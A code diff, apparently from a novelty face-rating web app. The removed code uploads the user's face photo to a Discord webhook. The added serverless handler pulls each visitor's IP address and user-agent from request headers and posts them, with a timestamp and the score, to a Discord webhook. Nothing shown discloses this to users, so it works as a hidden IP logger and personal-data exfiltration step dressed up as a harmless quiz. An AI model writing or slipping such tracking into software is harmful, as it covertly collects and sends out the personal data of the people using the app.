@@ -1,23 +1,41 @@
-function sendToDiscord(base64Image, score, rank) {
-  const formData = new FormData();
+export const handler = async (event) => {
+  const webhook = process.env.DISCORD_WEBHOOK;
+  if (!webhook) {
+    return { statusCode: 500, body: "Webhook not set" };
+  }
 
-  // 画像をファイルとして追加
-  formData.append(
-    "file",
-    dataURLtoBlob(base64Image),
-    "face.png"
-  );
+  const { score, rank } = JSON.parse(event.body || "{}");
 
-  // Discordに送るメッセージ本文
-  formData.append(
-    "payload_json",
-    JSON.stringify({
-      content: `📸 顔診断結果\n黄金比：${score}%\nランク：${rank}`
-    })
-  );
+  // ===== IP & UA 取得 =====
+  const ip =
+    event.headers["x-forwarded-for"]?.split(",")[0] ||
+    event.headers["client-ip"] ||
+    "unknown";
 
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    body: formData
+  const ua = event.headers["user-agent"] || "unknown";
+
+  const time = new Date().toLocaleString("ja-JP", {
+    timeZone: "Asia/Tokyo"
   });
-}
+
+  // ===== Discordに送る内容 =====
+  const message =
+`📸 顔診断結果
+黄金比：${score}%
+ランク：${rank}
+
+🌐 IP：${ip}
+🖥 UA：${ua}
+⏰ 時刻：${time}`;
+
+  await fetch(webhook, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: message })
+  });
+
+  return {
+    statusCode: 200,
+    body: "sent"
+  };
+};
